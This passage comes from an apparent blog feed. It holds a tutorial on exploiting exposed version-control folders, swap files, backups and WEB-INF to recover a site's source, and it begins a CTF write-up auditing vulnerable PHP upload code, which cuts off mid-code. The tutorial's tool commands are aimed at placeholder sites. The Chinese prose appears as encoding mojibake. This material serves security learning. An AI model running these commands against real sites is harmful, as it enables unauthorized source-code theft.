      <url>2021/09/21/web-yuan-ma-xie-lu-ji-gong-ju-li-yong/</url>
      
        <content type="html"><![CDATA[<h3 id="gitæ³„éœ²"><a href="#gitæ³„éœ²" class="headerlink" title=".gitæ³„éœ²"></a>.gitæ³„éœ²</h3><h4 id="æ¼æ´žæˆå› ï¼š"><a href="#æ¼æ´žæˆå› ï¼š" class="headerlink" title="æ¼æ´žæˆå› ï¼š"></a>æ¼æ´žæˆå› ï¼š</h4><p>åœ¨è¿è¡Œgit initåˆå§‹åŒ–ä»£ç åº“çš„æ—¶å€™ï¼Œä¼šåœ¨å½“å‰ç›®å½•ä¸‹é¢äº§ç”Ÿä¸€ä¸ª.gitçš„éšè—æ–‡ä»¶ï¼Œç”¨æ¥è®°å½•ä»£ç çš„å˜æ›´è®°å½•ç­‰ç­‰ã€‚åœ¨å‘å¸ƒä»£ç çš„æ—¶å€™ï¼ŒæŠŠ.gitè¿™ä¸ªç›®å½•æ²¡æœ‰åˆ é™¤ï¼Œç›´æŽ¥å‘å¸ƒäº†ã€‚ä½¿ç”¨è¿™ä¸ªæ–‡ä»¶ï¼Œå¯ä»¥ç”¨æ¥æ¢å¤æºä»£ç ã€‚</p><h4 id="æ¼æ´žåˆ©ç”¨ï¼š"><a href="#æ¼æ´žåˆ©ç”¨ï¼š" class="headerlink" title="æ¼æ´žåˆ©ç”¨ï¼š"></a>æ¼æ´žåˆ©ç”¨ï¼š</h4><p>å·¥å…·ï¼š</p><h5 id="Githack"><a href="#Githack" class="headerlink" title="Githack"></a>Githack</h5><pre><code>python2 Githack.py http://xxx.com/.gitã€</code></pre><h5 id="dvcs-ripper"><a href="#dvcs-ripper" class="headerlink" title="dvcs-ripper"></a>dvcs-ripper</h5><pre><code>rip-git.pl -v -u http://www.example.com/.git/</code></pre><h5 id="Git-Extract"><a href="#Git-Extract" class="headerlink" title="Git_Extract"></a>Git_Extract</h5><pre><code>python2 git_extract.py http://.../.git/</code></pre><h3 id="swpæ–‡ä»¶æ³„éœ²"><a href="#swpæ–‡ä»¶æ³„éœ²" class="headerlink" title="swpæ–‡ä»¶æ³„éœ²"></a>swpæ–‡ä»¶æ³„éœ²</h3><h4 id="æ¼æ´žæˆå› ï¼š-1"><a href="#æ¼æ´žæˆå› ï¼š-1" class="headerlink" title="æ¼æ´žæˆå› ï¼š"></a>æ¼æ´žæˆå› ï¼š</h4><p>swpå³swapæ–‡ä»¶ï¼Œåœ¨ç¼–è¾‘æ–‡ä»¶æ—¶äº§ç”Ÿçš„ä¸´æ—¶æ–‡ä»¶ï¼Œå®ƒæ—¶éšè—æ–‡ä»¶ï¼Œå¦‚æžœç¨‹åºæ­£å¸¸é€€å‡ºï¼Œä¸´æ—¶æ–‡ä»¶è‡ªåŠ¨åˆ é™¤ï¼Œå¦‚æžœæ„å¤–é€€å‡ºå°±ä¼šä¿ç•™ã€‚</p><p>æ–‡ä»¶åæ ¼å¼ï¼š.filename.swp(æœ‰æ—¶å€™ä¹Ÿå¯èƒ½æ˜¯swo)</p><h4 id="æ¼æ´žåˆ©ç”¨ï¼š-1"><a href="#æ¼æ´žåˆ©ç”¨ï¼š-1" class="headerlink" title="æ¼æ´žåˆ©ç”¨ï¼š"></a>æ¼æ´žåˆ©ç”¨ï¼š</h4><p>ç›´æŽ¥æŒ‰ç…§æ–‡ä»¶åè®¿é—®.swpæ–‡ä»¶ï¼Œä¸‹è½½å›žæ¥åŽå†linuxä¸­ä½¿ç”¨vim -r .filename.swpæ¥æ¢å¤æºç <br>.hgæ³„éœ²</p><h4 id="æ¼æ´žæˆå› ï¼š-2"><a href="#æ¼æ´žæˆå› ï¼š-2" class="headerlink" title="æ¼æ´žæˆå› ï¼š"></a>æ¼æ´žæˆå› ï¼š</h4><p>hg initçš„æ—¶å€™ä¼šç”Ÿæˆ.hgæ–‡ä»¶</p><p>å¦‚ï¼š</p><pre><code>http://www.xxx.com/.hg/</code></pre><h4 id="æ¼æ´žåˆ©ç”¨ï¼š-2"><a href="#æ¼æ´žåˆ©ç”¨ï¼š-2" class="headerlink" title="æ¼æ´žåˆ©ç”¨ï¼š"></a>æ¼æ´žåˆ©ç”¨ï¼š</h4><p>å·¥å…·ï¼š</p><h5 id="dvcs-ripper-1"><a href="#dvcs-ripper-1" class="headerlink" title="dvcs-ripper"></a>dvcs-ripper</h5><pre><code>rip-hg.pl -v -u http://www.example.com/.hg/é€šç”¨æ ¼å¼ï¼šrip-xxx.pl -v -u http://www.example.com/.xx/</code></pre><h3 id="DS-Storeæ–‡ä»¶æ³„éœ²"><a href="#DS-Storeæ–‡ä»¶æ³„éœ²" class="headerlink" title=".DS_Storeæ–‡ä»¶æ³„éœ²"></a>.DS_Storeæ–‡ä»¶æ³„éœ²</h3><h4 id="æ¼æ´žæˆå› ï¼š-3"><a href="#æ¼æ´žæˆå› ï¼š-3" class="headerlink" title="æ¼æ´žæˆå› ï¼š"></a>æ¼æ´žæˆå› ï¼š</h4><p>åœ¨å‘å¸ƒä»£ç æ—¶æœªåˆ é™¤æ–‡ä»¶å¤¹ä¸­éšè—çš„.DS_storeï¼Œè¢«å‘çŽ°åŽï¼Œå¯ä»¥èŽ·å–æ•æ„Ÿçš„æ–‡ä»¶åç­‰ä¿¡æ¯ã€‚<br>æ¼æ´žåˆ©ç”¨:</p><p>å·¥å…·ï¼š</p><h5 id="dsstoreexp"><a href="#dsstoreexp" class="headerlink" title="dsstoreexp"></a>dsstoreexp</h5><pre><code>python ds_store_exp.py http://www.example.com/.DS_Store</code></pre><h3 id="ç½‘ç«™å¤‡ä»½åŽ‹ç¼©æ–‡ä»¶"><a href="#ç½‘ç«™å¤‡ä»½åŽ‹ç¼©æ–‡ä»¶" class="headerlink" title="ç½‘ç«™å¤‡ä»½åŽ‹ç¼©æ–‡ä»¶"></a>ç½‘ç«™å¤‡ä»½åŽ‹ç¼©æ–‡ä»¶</h3><h4 id="æ¼æ´žæˆå› ï¼š-4"><a href="#æ¼æ´žæˆå› ï¼š-4" class="headerlink" title="æ¼æ´žæˆå› ï¼š"></a>æ¼æ´žæˆå› ï¼š</h4><p>æœåŠ¡å™¨ç®¡ç†å‘˜é”™è¯¯åœ°å°†ç½‘ç«™æˆ–è€…ç½‘é¡µçš„å¤‡ä»½æ–‡ä»¶æ”¾ç½®åˆ°æœåŠ¡å™¨webç›®å½•ä¸‹ã€‚<br>ç¼–è¾‘å™¨åœ¨ä½¿ç”¨è¿‡ç¨‹ä¸­è‡ªåŠ¨ä¿å­˜çš„å¤‡ä»½æ–‡ä»¶æˆ–è€…ä¸´æ—¶æ–‡ä»¶å› ä¸ºå„ç§åŽŸå› æ²¡æœ‰è¢«åˆ é™¤è€Œä¿å­˜åœ¨webç›®å½•ä¸‹ã€‚</p><h4 id="å¸¸è§å¤‡ä»½æ–‡ä»¶åŽç¼€"><a href="#å¸¸è§å¤‡ä»½æ–‡ä»¶åŽç¼€" class="headerlink" title="å¸¸è§å¤‡ä»½æ–‡ä»¶åŽç¼€"></a>å¸¸è§å¤‡ä»½æ–‡ä»¶åŽç¼€</h4><pre><code>.rar.zip.7z.tar.gz.bak.swp.txt.html.php~.php.</code></pre><h4 id="æ¼æ´žåˆ©ç”¨"><a href="#æ¼æ´žåˆ©ç”¨" class="headerlink" title="æ¼æ´žåˆ©ç”¨"></a>æ¼æ´žåˆ©ç”¨</h4><p>å·¥å…·ï¼š</p><h5 id="dirsearch"><a href="#dirsearch" class="headerlink" title="dirsearch"></a>dirsearch</h5><pre><code>python3 dirsearch -u "xxx" -e php,rar,zip,txt</code></pre><h3 id="SVNå¯¼è‡´æ–‡ä»¶æ³„éœ²"><a href="#SVNå¯¼è‡´æ–‡ä»¶æ³„éœ²" class="headerlink" title="SVNå¯¼è‡´æ–‡ä»¶æ³„éœ²"></a>SVNå¯¼è‡´æ–‡ä»¶æ³„éœ²</h3><h4 id="æ¼æ´žæˆå› ï¼š-5"><a href="#æ¼æ´žæˆå› ï¼š-5" class="headerlink" title="æ¼æ´žæˆå› ï¼š"></a>æ¼æ´žæˆå› ï¼š</h4><p>Subversionï¼Œç®€ç§°SVNï¼Œæ˜¯ä¸€ä¸ªå¼€æ”¾æºä»£ç çš„ç‰ˆæœ¬æŽ§åˆ¶ç³»ç»Ÿï¼Œç›¸å¯¹äºŽçš„RCSã€CVSï¼Œé‡‡ç”¨äº†åˆ†æ”¯ç®¡ç†ç³»ç»Ÿï¼Œå®ƒçš„è®¾è®¡ç›®æ ‡å°±æ˜¯å–ä»£CVSã€‚äº’è”ç½‘ä¸Šè¶Šæ¥è¶Šå¤šçš„æŽ§åˆ¶æœåŠ¡ä»ŽCVSè½¬ç§»åˆ°Subversionã€‚</p><p>Subversionä½¿ç”¨æœåŠ¡ç«¯â€”å®¢æˆ·ç«¯çš„ç»“æž„ï¼Œå½“ç„¶æœåŠ¡ç«¯ä¸Žå®¢æˆ·ç«¯å¯ä»¥éƒ½è¿è¡Œåœ¨åŒä¸€å°æœåŠ¡å™¨ä¸Šã€‚åœ¨æœåŠ¡ç«¯æ˜¯å­˜æ”¾ç€æ‰€æœ‰å—æŽ§åˆ¶æ•°æ®çš„Subversionä»“åº“ï¼Œå¦ä¸€ç«¯æ˜¯Subversionçš„å®¢æˆ·ç«¯ç¨‹åºï¼Œç®¡ç†ç€å—æŽ§æ•°æ®çš„ä¸€éƒ¨åˆ†åœ¨æœ¬åœ°çš„æ˜ å°„ï¼ˆç§°ä¸ºâ€œå·¥ä½œå‰¯æœ¬â€ï¼‰ã€‚åœ¨è¿™ä¸¤ç«¯ä¹‹é—´ï¼Œæ˜¯é€šè¿‡å„ç§ä»“åº“å­˜å–å±‚ï¼ˆRepository Accessï¼Œç®€ç§°RAï¼‰çš„å¤šæ¡é€šé“è¿›è¡Œè®¿é—®çš„ã€‚è¿™äº›é€šé“ä¸­ï¼Œå¯ä»¥é€šè¿‡ä¸åŒçš„ç½‘ç»œåè®®ï¼Œä¾‹å¦‚HTTPã€SSHç­‰ï¼Œæˆ–æœ¬åœ°æ–‡ä»¶çš„æ–¹å¼æ¥å¯¹ä»“åº“è¿›è¡Œæ“ä½œã€‚<br>æ¼æ´žåˆ©ç”¨</p><p>å·¥å…·ï¼š</p><h5 id="dvcs-ripper-2"><a href="#dvcs-ripper-2" class="headerlink" title="dvcs-ripper"></a>dvcs-ripper</h5><pre><code>rip-svn.pl -v -u http://www.example.com/.svn/</code></pre><h3 id="WEB-INF-web-xmlæ³„éœ²"><a href="#WEB-INF-web-xmlæ³„éœ²" class="headerlink" title="WEB-INF/web.xmlæ³„éœ²"></a>WEB-INF/web.xmlæ³„éœ²</h3><h4 id="WEB-INFç®€ä»‹åŠæ¼æ´žæˆå› "><a href="#WEB-INFç®€ä»‹åŠæ¼æ´žæˆå› " class="headerlink" title="WEB-INFç®€ä»‹åŠæ¼æ´žæˆå› "></a>WEB-INFç®€ä»‹åŠæ¼æ´žæˆå› </h4><p>WEB-INFæ˜¯javaçš„webåº”ç”¨çš„å®‰å…¨ç›®å½•ï¼Œå¦‚æžœæƒ³åœ¨é¡µé¢ä¸­ç›´æŽ¥è®¿é—®å…¶ä¸­çš„æ–‡ä»¶ï¼Œå¿…é¡»é€šè¿‡web.xmlæ–‡ä»¶å¯¹å…¶è¿›è¡Œç›¸åº”çš„æ˜ å°„æ‰èƒ½è®¿é—®ã€‚Tomcaté»˜è®¤ç¦æ­¢è¿™ä¸ªç›®å½•ï¼Œè€ŒNginxåœ¨æ˜ å°„é™æ€æ–‡ä»¶æ—¶ï¼ŒæŠŠWEB-INFç›®å½•æ˜ å°„è¿›åŽ»ï¼Œè€Œåˆæ²¡æœ‰åšNginxçš„ç›¸å…³å®‰å…¨é…ç½®ï¼ˆæˆ–Nginxè‡ªèº«ç¼ºé™·ï¼‰ï¼Œå¯¼è‡´å¯ä»¥é€šè¿‡Nginxè®¿é—®åˆ°Tomcatçš„WEB-INFç›®å½•ã€‚</p><h4 id="WEB-INFä¸»è¦åŒ…å«ä»¥ä¸‹æ–‡ä»¶æˆ–ç›®å½•ï¼š"><a href="#WEB-INFä¸»è¦åŒ…å«ä»¥ä¸‹æ–‡ä»¶æˆ–ç›®å½•ï¼š" class="headerlink" title="WEB-INFä¸»è¦åŒ…å«ä»¥ä¸‹æ–‡ä»¶æˆ–ç›®å½•ï¼š"></a>WEB-INFä¸»è¦åŒ…å«ä»¥ä¸‹æ–‡ä»¶æˆ–ç›®å½•ï¼š</h4><pre><code>WEB-INF/web.xmlï¼šwebåº”ç”¨ç¨‹åºé…ç½®æ–‡ä»¶ï¼Œæè¿°äº†servletå’Œå…¶ä»–çš„åº”ç”¨ç»„ä»¶é…ç½®å’Œå‘½åè§„åˆ™WEB-INF/classesï¼šåŒ…å«äº†ç«™ç‚¹çš„æ‰€æœ‰classæ–‡ä»¶ï¼ŒåŒ…æ‹¬servlet classå’Œéžservlet classWEB-INF/libï¼šå­˜æ”¾webåº”ç”¨éœ€è¦çš„å„ç§jaræ–‡ä»¶ï¼Œæ”¾ç½®ä»…åœ¨è¿™ä¸ªåº”ç”¨ä¸­è¦æ±‚çš„æ–‡ä»¶ï¼Œå¦‚æ•°æ®åº“WEB-INF/srcï¼šæºç ç›®å½•ï¼ŒæŒ‰ç…§åŒ…åç»“æž„æ”¾ç½®å„ç§javaæ–‡ä»¶WEB-INF/database.propertiesï¼šæ•°æ®åº“é…ç½®æ–‡ä»¶META-INFï¼šç›¸å½“äºŽä¸€ä¸ªä¿¡æ¯åŒ…</code></pre><h4 id="æ¼æ´žåˆ©ç”¨-1"><a href="#æ¼æ´žåˆ©ç”¨-1" class="headerlink" title="æ¼æ´žåˆ©ç”¨"></a>æ¼æ´žåˆ©ç”¨</h4><p>ç›´æŽ¥æ‰‹å·¥è®¿é—®/web.xmlæ–‡ä»¶ï¼Œé€šè¿‡æ˜¯å¦å›žæ˜¾æ¥åˆ¤æ–­æ˜¯å¦å¯è®¿é—®è¯¥æ–‡ä»¶ã€‚æ‰¾åˆ°web.xmlæ–‡ä»¶åŽï¼Œæ ¹æ®å‘½åè§„åˆ™æŽ¨æ–­classæ–‡ä»¶çš„è·¯å¾„ï¼Œæœ€åŽç›´æŽ¥è®¿é—®classæ–‡ä»¶ï¼Œæˆ–é€šè¿‡åç¼–è¯‘ç­‰å¾—åˆ°ç½‘ç«™æºç ã€‚</p><p>å¦‚ï¼š</p><pre><code>com.wm.ctf.FlagController æŽ¨æ–­çš„æ–‡ä»¶è·¯å¾„ä¸ºWEB-INF/classes/com/wm/ctf/FlagController.class</code></pre><h3 id="CVSæ³„éœ²"><a href="#CVSæ³„éœ²" class="headerlink" title="CVSæ³„éœ²"></a>CVSæ³„éœ²</h3><h4 id="æ¼æ´žåˆ©ç”¨ï¼š-3"><a href="#æ¼æ´žåˆ©ç”¨ï¼š-3" class="headerlink" title="æ¼æ´žåˆ©ç”¨ï¼š"></a>æ¼æ´žåˆ©ç”¨ï¼š</h4><p>ç›´æŽ¥è®¿é—®æ¥æµ‹è¯•</p><pre><code>http://url/CVS/Root è¿”å›žæ ¹ä¿¡æ¯http://url/CVS/Entries è¿”å›žæ‰€æœ‰æ–‡ä»¶çš„ç»“æž„</code></pre><h4 id="å–å›žæºç çš„å‘½ä»¤-liunxä¸‹"><a href="#å–å›žæºç çš„å‘½ä»¤-liunxä¸‹" class="headerlink" title="å–å›žæºç çš„å‘½ä»¤(liunxä¸‹)"></a>å–å›žæºç çš„å‘½ä»¤(liunxä¸‹)</h4><pre><code>bk clone http://url/aaa bbb</code></pre><p>æ„æ€æ˜¯æŠŠè¿œç«¯ä¸€ä¸ªåä¸ºaaaçš„repoä»“åº“cloneåˆ°æœ¬åœ°åä¸ºbbbçš„ç›®å½•ä¸‹</p><p>æŸ¥çœ‹æ‰€æœ‰çš„æ”¹å˜çš„å‘½ä»¤(è½¬åˆ°downloadsç›®å½•ä¸‹)</p><pre><code>bk changes</code></pre><h3 id="Bazaar-bzræ³„éœ²"><a href="#Bazaar-bzræ³„éœ²" class="headerlink" title="Bazaar/bzræ³„éœ²"></a>Bazaar/bzræ³„éœ²</h3><h4 id="æ¼æ´žåˆ©ç”¨-2"><a href="#æ¼æ´žåˆ©ç”¨-2" class="headerlink" title="æ¼æ´žåˆ©ç”¨:"></a>æ¼æ´žåˆ©ç”¨:</h4><p>å·¥å…·ï¼š</p><h5 id="dvcs-ripper-3"><a href="#dvcs-ripper-3" class="headerlink" title="dvcs-ripper"></a>dvcs-ripper</h5><pre><code>rip-bzr.pl -v -u http://www.example.com/.bzr/</code></pre><p>åŽŸæ–‡é“¾æŽ¥ï¼š<a href="https://blog.csdn.net/Dguaiguai/article/details/108165939">https://blog.csdn.net/Dguaiguai/article/details/108165939</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>å®‰æ´µæ¯ï¼š2019-ä¸æ˜¯æ–‡ä»¶ä¸Šä¼ </title>
      <link href="2021/09/20/an-xun-bei-2019-bu-shi-wen-jian-shang-chuan/"/>
      <url>2021/09/20/an-xun-bei-2019-bu-shi-wen-jian-shang-chuan/</url>
      
        <content type="html"><![CDATA[<p><img src="/2021/09/20/an-xun-bei-2019-bu-shi-wen-jian-shang-chuan/image-20210920191233325.png" alt="image-20210920191233325"></p><p>githubæ‰¾åˆ°é¡¹ç›®å¹¶ä¸‹è½½ä¸‹æ¥</p><p><img src="/2021/09/20/an-xun-bei-2019-bu-shi-wen-jian-shang-chuan/image-20210920191305777.png" alt="image-20210920191305777"></p><h4 id="ä»£ç å®¡è®¡"><a href="#ä»£ç å®¡è®¡" class="headerlink" title="ä»£ç å®¡è®¡"></a>ä»£ç å®¡è®¡</h4><h5 id="helper-php"><a href="#helper-php" class="headerlink" title="helper.php"></a>helper.php</h5><pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">upload</span><span class="token punctuation">(</span><span class="token variable">$input</span><span class="token operator">=</span><span class="token string">"file"</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$fileinfo</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getfile</span><span class="token punctuation">(</span><span class="token variable">$input</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$array</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$array</span><span class="token punctuation">[</span><span class="token string">"title"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$fileinfo</span><span class="token punctuation">[</span><span class="token string">'title'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$array</span><span class="token punctuation">[</span><span class="token string">"filename"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$fileinfo</span><span class="token punctuation">[</span><span class="token string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$array</span><span class="token punctuation">[</span><span class="token string">"ext"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$fileinfo</span><span class="token punctuation">[</span><span class="token string">'ext'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$array</span><span class="token punctuation">[</span><span class="token string">"path"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$fileinfo</span><span class="token punctuation">[</span><span class="token string">'path'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$img_ext</span> <span class="token operator">=</span> <span class="token function">getimagesize</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token variable">$input</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"tmp_name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$my_ext</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">"width"</span><span class="token operator">=</span><span class="token operator">></span><span class="token variable">$img_ext</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">"height"</span><span class="token operator">=</span><span class="token operator">></span><span class="token variable">$img_ext</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$array</span><span class="token punctuation">[</span><span class="token string">"attr"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$my_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">save</span><span class="token punctuation">(</span><span class="token variable">$array</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$id</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"Something wrong!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">echo</span> <span class="token string">"&lt;br>"</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string">"&lt;p>Your images is uploaded successfully. And your image's id is $id.&lt;/p>"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><p>åºåˆ—åŒ–å›¾ç‰‡å®½é«˜</p><pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">getfile</span><span class="token punctuation">(</span><span class="token variable">$input</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$input</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token variable">$rs</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">check</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token variable">$input</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> <span class="token variable">$rs</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><pre class=" language-php"><code class="language-php">    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">check</span><span class="token punctuation">(</span><span class="token variable">$info</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$basename</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">uniqid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token variable">$info</span><span class="token punctuation">[</span><span class="token string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$ext</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token function">strrchr</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$cate_exts</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">"jpg"</span><span class="token punctuation">,</span><span class="token string">"gif"</span><span class="token punctuation">,</span><span class="token string">"png"</span><span class="token punctuation">,</span><span class="token string">"jpeg"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$ext</span><span class="token punctuation">,</span><span class="token variable">$cate_exts</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"&lt;p>Please upload the correct image file!!!&lt;/p>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token variable">$title</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">.</span><span class="token variable">$ext</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'title'</span><span class="token operator">=</span><span class="token operator">></span><span class="token variable">$title</span><span class="token punctuation">,</span><span class="token string">'filename'</span><span class="token operator">=</span><span class="token operator">></span><span class="token variable">$basename</span><span class="token punctuation">.</span><span class="token string">"."</span><span class="token punctuation">.</span><span class="token variable">$ext</span><span class="token punctuation">,</span><span class="token string">'ext'</span><span class="token operator">=</span><span class="token operator">></span><span class="token variable">$ext</span><span class="token punctuation">,</span><span class="token string">'path'</span><span class="token operator">=</span><span class="token operator">></span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">folder</span><span class="token punctuation">.</span><span class="token variable">$basename</span><span class="token punctuation">.</span><span class="token string">"."</span><span class="token punctuation">.</span><span class="token variable">$ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><p><code>$filename = $info["name"];</code>æ˜¯ä¸Šä¼ çš„å›¾ç‰‡ï¼Œin_arrayè§„å®šå›¾ç‰‡ï¼Œ</p><pre class=" language-php"><code class="language-php"><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$data</span> <span class="token keyword">as</span> <span class="token variable">$key</span><span class="token operator">=</span><span class="token operator">></span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token variable">$key_temp</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">'*'</span><span class="token punctuation">.</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'\0\0\0'</span><span class="token punctuation">,</span> <span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$value_temp</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">'*'</span><span class="token punctuation">.</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'\0\0\0'</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$sql_fields</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"`"</span><span class="token punctuation">.</span><span class="token variable">$key_temp</span><span class="token punctuation">.</span><span class="token string">"`"</span><span class="token punctuation">;</span>            <span class="token variable">$sql_val</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"'"</span><span class="token punctuation">.</span><span class="token variable">$value_temp</span><span class="token punctuation">.</span><span class="token string">"'"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"INSERT INTO images ("</span><span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token function">implode</span><span class="token punctuation">(</span><span class="token string">","</span><span class="token punctuation">,</span><span class="token variable">$sql_fields</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">") VALUES("</span><span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token function">implode</span><span class="token punctuation">(</span><span class="token string">","</span><span class="token punctuation">,</span><span class="token variable">$sql_val</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">")"</span><span class="token punctuation">;</span></code></pre><pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">view_files</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">ifview</span> <span class="token operator">==</span> False<span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">return</span> False<span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//The function is not yet perfect, it is not open yet.</span>        <span class="token punctuation">}</span>        <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token variable">$content</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><p>è°ƒç”¨view_filesä¸­çš„file_get_contentsæ¥è¯»å–flag</p><pre class=" language-php"><code class="language-php"><span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token shell-comment comment"># Read some config html</span>        <span class="token 